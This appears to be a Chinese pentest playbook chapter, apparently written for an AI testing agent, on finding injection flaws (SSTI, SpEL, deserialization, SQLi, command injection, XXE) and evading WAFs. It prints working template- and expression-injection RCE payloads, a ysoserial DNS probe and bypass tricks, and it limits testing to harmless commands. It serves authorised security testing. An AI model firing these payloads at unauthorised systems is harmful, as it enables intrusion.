# 品类 5 · 注入（SSTI / 表达式 / 反序列化 / SQLi / 命令 / XXE）+ WAF 绕过

> **为什么独立成类**：**实锤危害最容易拿到**（RCE/文件读/数据读）—— 判据清晰、不依赖业务理解。
> 缺点是被 WAF 挡，所以本册把「绕过」并进来（同一类问题：**如何让 payload 到达**）。
> 来源：PortSwigger · `yaklang/hack-skills` ssti / expression-language / deserialization / sqli / cmdi / xxe / waf-bypass。

## 何时用
- 任何**用户输入被拼进**模板/表达式/查询/命令/XML 的地方
- 报错里出现模板语法、SQL 关键字、栈信息
- 有 `format` / `template` / `expression` / `render` / `query` / `sort` / `orderBy` 参数

## 一、SSTI（引擎指纹 → RCE）

**探测序列**（**先确认是模板求值，不是字符串替换**）：

```
{{7*7}}  → 49 → Jinja2 或 Twig        ${7*7} → 49 → FreeMarker/Velocity/Java EL
#{7*7}   → Ruby ERB                   @{7*7} / *{7*7} → Thymeleaf
<#assign x=7*7>${x} → FreeMarker
```

**Jinja2 vs Twig 一条定死**：`{{7*'7'}}` → **7777777 = Jinja2**（Python 字符串乘法）| **49 = Twig**（PHP 数字）

**引擎 → 语言**：Jinja2/Django/Mako/Tornado=Py · Twig/Smarty=PHP · FreeMarker/Velocity/Pebble/Thymeleaf=Java ·
ERB/Slim=Ruby · Pug/Handlebars=Node

**Jinja2 RCE 三链**（按被拦换）：
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}                                            # MRO 沙箱逃逸
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}     # config 被拦
```
**Twig** `{{['id']|filter('system')}}` · **FreeMarker** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

**判据**：**数学被求值**（不是"报错"）。**盲 SSTI** 用 `sleep` 时间差。

## 二、表达式注入（SpEL / OGNL）—— 与 SSTI 区分

SSTI 打模板引擎；表达式注入打**框架的表达式求值**（Spring `@Value` / Cloud Gateway CVE-2022-22947 / Struts2 参数）。
```java
${T(java.lang.Runtime).getRuntime().exec("id")}
${new java.lang.ProcessBuilder({"id"}).start()}
```

## 三、反序列化（**先认指纹，再用 URLDNS 安全探测**）

| 语言 | 指纹 | 位置 |
|---|---|---|
| Java | hex `ac ed 00 05` · Base64 **`rO0AB`** · `application/x-java-serialized-object` | cookie(`rememberMe`)、隐藏表单、T3/IIOP(7001/7002) |
| PHP | `O:<n>:"Class"` · `a:<n>:{` · `phar://` | POST body、cookie、session、文件操作路径 |
| Python | `80 03` / `80 04` | API 参数、cookie、Redis、消息队列 |

**★ 安全确认探测：Java `URLDNS`** —— 只做一次 DNS 解析、**不执行代码**：
```bash
# ⚠ 本机 WSL **没有 java**（AGENTS.md 已记）→ ysoserial 必须在 **Windows 侧**跑：
#   /mnt/c/Program\ Files/Java/latest/bin/java.exe -jar ysoserial.jar URLDNS "http://<你的dnslog>/" | base64 -w0
#   本机也**没有** ysoserial.jar，需自行下载（未实操）
```
dnslog 回显 = **反序列化点确认**（0 危害），**再**决定要不要上真 gadget。
**坑**：直接上 CommonsCollections 可能把目标打挂。

**★ Python pickle 侧的静态检查（本机已装，实测可判）**：
```bash
tools/venv/bin/python -m fickling --check-safety --print-results --json-output out.json suspect.pkl
#   JSON 里 severity = LIKELY_OVERTLY_MALICIOUS / SUSPICIOUS → 机器可判
#   实测：os.system 载荷 → LIKELY_OVERTLY_MALICIOUS + 指出 "from posix import system"
```
**用途**：拿第三方模型文件（`.pt`/`.pkl`）**先扫再加载** —— 恶意模型文件 = Pickle RCE（见品类 14/AI 段）。

## 四、SQLi / 命令注入 / XXE（快速判据）

| 类 | 最快判据 | 备注 |
|---|---|---|
| SQLi | `orderBy`/`sortField` 参数**手试优先**（sqlmap 对 JSON 支持差） | 时间盲注用短延时；`--dump` **禁用**（脱库） |
| 命令注入 | `sleep` / `ping` 自己的 dnslog | `commix` 可用；**别用破坏性命令** |
| XXE | 带外 DTD 打到自己的 dnslog | 现代场景：SVG / XLSX / DOCX 上传点、SOAP |

## 五、WAF 绕过（四类，**别只背 payload**）

| 类 | 手法 |
|---|---|
| **编码** | URL/双重编码 · Unicode 超长 · 大小写混写 · HTML 实体 · 十六进制 |
| **分块传输** | `Transfer-Encoding: chunked` 把 payload 切碎 → WAF 拼不回来 |
| **HTTP/2 二进制** | H2 二进制格式让 WAF 的 H1 规则失效 |
| **HPP** | 同参数给两次（WAF 看第一个、后端用第二个） |
| 其他 | 注释插入 `/*!*/` · 等价函数替换 · `+` 代空格 |

先认 WAF：`wafw00f` + 行为指纹（拦什么、返回什么页）。
**判据：能过 WAF 的 payload 才算验证成功**（见 `references/收洞判定.md`）。

## 坑
- **验证码/注入类别死磕一个 payload**：同一 payload 试到第 3 次无反应 → 换编码/换等价函数（`attempts≥3` 规则）
- **反射型输出不等于求值**：SSTI 要看**数学结果**
- **反序列化先 URLDNS**（见上）
- **`--dump` / `--os-shell` 一律不用**

## 证据怎么留
```bash
fgs fact-add <pid> "<结论>" --confidence verified --verdict accepted \
    --severity critical --proof-kind side_read --target <host>
```
**必须带**：完整 payload + 原始响应（命令回显/文件内容/时间差）。
RCE 类**只证明到能执行一条无害命令**（`id` / `echo`），**不做持久化、不读敏感文件、不横向**。
